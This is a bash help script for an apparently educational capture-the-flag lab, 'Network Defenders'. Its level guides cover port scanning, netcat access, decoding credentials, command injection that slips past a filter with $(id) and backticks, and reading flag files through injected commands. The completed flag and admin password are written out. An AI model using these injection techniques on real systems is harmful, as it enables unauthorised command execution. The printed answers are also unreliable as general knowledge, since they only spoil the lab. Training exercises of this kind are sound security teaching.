#!/bin/bash
# /home/kali/scripts/help.sh
# This script displays help information based on the current security level

# File to store security level
SECURITY_FILE="/home/kali/.security_level"
if [ ! -f "$SECURITY_FILE" ]; then
  echo "5" > "$SECURITY_FILE"  # Start with max security
fi
LOCAL_SECURITY=$(cat "$SECURITY_FILE")

# Get target from environment variable or use default
if [ -z "$DEFENSE_CONTAINER_HOST" ]; then
  TARGET="defense-service"
else
  TARGET="$DEFENSE_CONTAINER_HOST"
fi

# Show detailed guides for each security level if requested
case $1 in
  "level5")
    cat << EOF
================= LEVEL 5: HIDDEN SERVICE DISCOVERY =================

OBJECTIVE: 
Find the hidden security token service and get a token to access port 4444.

DETAILED INSTRUCTIONS:
1. The basic port scan doesn't reveal all open ports
2. Run a full port scan to find hidden services:
   $ nmap -p- $TARGET
   
3. Look for unusual open ports (port 8888)
4. Connect to the hidden service to get a token:
   $ nc $TARGET 8888
   
5. Use the token to connect to port 4444:
   $ echo "TOKEN=XXXXXXXX" | nc $TARGET 4444

SUCCESS CRITERIA:
When you connect to port 4444 with a valid token, the security level 
will drop to 4, allowing access to the network service.
EOF
    exit 0
    ;;
  "level4")
    cat << EOF
================= LEVEL 4: SERVICE ENUMERATION =================

OBJECTIVE:
Enumerate available services and find vulnerabilities in the network controller.

DETAILED INSTRUCTIONS:
1. Connect to the network service:
   $ nc $TARGET 4444
   
2. List available services:
   > list
   
3. First explore the registry service to understand all available services:
   > explore registry.service
   
4. Look for interesting services - the network controller is key:
   > explore network.controller
   
5. Use additional parameters for deeper exploration:
   > explore network.controller --depth=full

SUCCESS CRITERIA:
When you find and exploit the network controller vulnerability, 
the security level will drop to 3, exposing the data access layer.
EOF
    exit 0
    ;;
  "level3")
    cat << EOF
================= LEVEL 3: CREDENTIAL DISCOVERY =================

OBJECTIVE:
Extract and decode credentials from the system configuration.

DETAILED INSTRUCTIONS:
1. Connect to the network service:
   $ nc $TARGET 4444
   
2. Use the data command to view available options:
   > data --help
   
3. List the users on the system:
   > data --show-users
   
4. View the system configuration containing encoded credentials:
   > data --show-config
   
5. The credentials are encoded in a two-step process:
   - Base64 encoded, then
   - ROT13 encoded
   
6. Reverse the process to decode:
   - First ROT13 decode
   - Then Base64 decode
   
7. Validate the decoded admin key:
   > data --validate-key SecurePass2023!

SUCCESS CRITERIA:
When you successfully validate the key, the security level will
drop to 2, allowing authentication to the system.
EOF
    exit 0
    ;;
  "level2")
    cat << EOF
================= LEVEL 2: COMMAND INJECTION =================

OBJECTIVE:
Bypass command filters to execute arbitrary commands on the system.

DETAILED INSTRUCTIONS:
1. Connect to the network service:
   $ nc $TARGET 4444
   
2. Login with the validated credentials:
   > login admin SecurePass2023!
   
3. Try using the run command with basic operations:
   > run backup.sh
   
4. Simple command injection with ; | && is blocked:
   > run backup.sh; id   (BLOCKED)
   
5. Try alternative command injection techniques:
   > run backup.sh \$(id)
   > run backup.sh \`id\`
   
6. Look for privilege escalation opportunities:
   > run backup.sh \$(id)
   > run backup.sh \$(whoami)

SUCCESS CRITERIA:
When you successfully execute both command injection and privilege 
escalation commands, the security level will drop to 1 (minimum).
EOF
    exit 0
    ;;
  "level1")
    cat << EOF
================= LEVEL 1: FLAG CAPTURE =================

OBJECTIVE:
Find all flag pieces and assemble the complete flag.

DETAILED INSTRUCTIONS:
1. Connect to the network service:
   $ nc $TARGET 4444
   
2. Search for flag pieces using command injection:
   > run backup.sh \$(find / -name "*flag*" 2>/dev/null)
   
3. Retrieve each flag piece:
   > run backup.sh \$(cat /opt/flags/flag_part1.txt)
   > run backup.sh \$(cat /opt/flags/flag_part2.txt)
   > run backup.sh \$(cat /opt/flags/flag_part3.txt)
   > run backup.sh \$(cat /home/user/flag_part4.txt)
   
4. Use the debug command to assemble the flag:
   > debug --memory  (to see hints)
   > debug --assemble --p1=flag{n3tw0rk_ --p2=d3f3nd3rs_ --p3=ch4ll3ng3_ --p4=c0mpl3t3d}

SUCCESS CRITERIA:
When you successfully assemble all flag pieces in the correct order,
you'll receive the complete flag and complete the challenge.
EOF
    exit 0
    ;;
esac

# Check if token is needed for connection
TOKEN_FILE="/home/kali/.security_token"
TOKEN_PARAM=""

if [ "$LOCAL_SECURITY" = "5" ] && [ -f "$TOKEN_FILE" ]; then
  TOKEN=$(cat "$TOKEN_FILE")
  TOKEN_PARAM="TOKEN=$TOKEN"
fi

# Verify current security level from defense server
if [ "$LOCAL_SECURITY" = "5" ] && [ -n "$TOKEN_PARAM" ]; then
  # Use token when connecting
  RESPONSE=$(timeout 3 bash -c "echo \"$TOKEN_PARAM\" | nc -w 3 $TARGET 4444 2>/dev/null" || echo "")
elif [ "$LOCAL_SECURITY" -lt "5" ]; then
  # Direct connection for lower security levels
  RESPONSE=$(timeout 3 bash -c "echo 'status' | nc -w 3 $TARGET 4444 2>/dev/null" || echo "")
fi

if [[ $RESPONSE == *"Security Level: "* ]]; then
  REMOTE_SECURITY=$(echo "$RESPONSE" | grep -oP "Security Level: \K[0-9]" | head -1)
  
  # If remote security is different from local, update local
  if [[ "$REMOTE_SECURITY" =~ ^[1-5]$ ]] && [[ "$REMOTE_SECURITY" != "$LOCAL_SECURITY" ]]; then
    echo "$REMOTE_SECURITY" > "$SECURITY_FILE"
    LOCAL_SECURITY="$REMOTE_SECURITY"
    echo "Note: Updated local security level to match server (Level ${LOCAL_SECURITY})"
    echo
  fi
else
  if [ "$LOCAL_SECURITY" = "5" ]; then
    if [ -z "$TOKEN_PARAM" ]; then
      echo "Warning: At security level 5, you need a token to connect."
      echo "Run scan-target.sh to find the hidden token service first."
    else
      echo "Warning: Token connection failed or expired."
      echo "Run scan-target.sh to get a new token."
    fi
    echo
  elif [ -z "$RESPONSE" ]; then
    echo "Warning: Cannot connect to defense server at ${TARGET}:4444"
    echo "Using local security information (Level ${LOCAL_SECURITY})"
    echo
  fi
fi

# Display header
echo "=== Network Defenders: CLI Edition ==="
echo "Security Level: $LOCAL_SECURITY (Lower = More Vulnerable)"
echo

# Show appropriate help based on current security level
case $LOCAL_SECURITY in
  5)
    echo "Current Task: Hidden Service Discovery"
    echo 
    echo "Objective: Find the hidden security token service and obtain access to port 4444."
    echo
    echo "Suggested commands:"
    echo "  nmap -p- $TARGET   - Run a full port scan to find hidden services"
    echo "  scan-target         - Run our enhanced scan script"
    echo "  help level5         - Show detailed help for this security level"
    ;;
  4)
    echo "Current Task: Service Enumeration"
    echo
    echo "Objective: Explore the available services and find vulnerabilities."
    echo
    echo "Suggested commands:"
    echo "  nc ${TARGET} 4444     - Connect to the network service"
    echo "  help level4           - Show detailed help for this security level"
    ;;
  3)
    echo "Current Task: Credential Extraction"
    echo
    echo "Objective: Extract and decode credentials from system configuration."
    echo
    echo "Suggested commands:"
    echo "  nc ${TARGET} 4444     - Connect to the network service"
    echo "  help level3           - Show detailed help for this security level"
    ;;
  2)
    echo "Current Task: Command Injection"
    echo
    echo "Objective: Bypass command filtering to execute arbitrary commands."
    echo
    echo "Suggested commands:"
    echo "  nc ${TARGET} 4444     - Connect to the network service"
    echo "  help level2           - Show detailed help for this security level"
    ;;
  1)
    echo "Current Task: Flag Assembly"
    echo
    echo "Objective: Find all flag pieces and assemble the complete flag."
    echo
    echo "Suggested commands:"
    echo "  nc ${TARGET} 4444     - Connect to the network service"
    echo "  help level1           - Show detailed help for this security level"
    ;;
  *)
    echo "Unknown security level: ${LOCAL_SECURITY}"
    echo "Please check with your instructor."
    ;;
esac

echo
echo "General commands:"
echo "  check-security    - Check if the security level has changed"
echo "  help              - Show this help menu"
echo "  help level<1-5>   - Show detailed help for a specific security level" 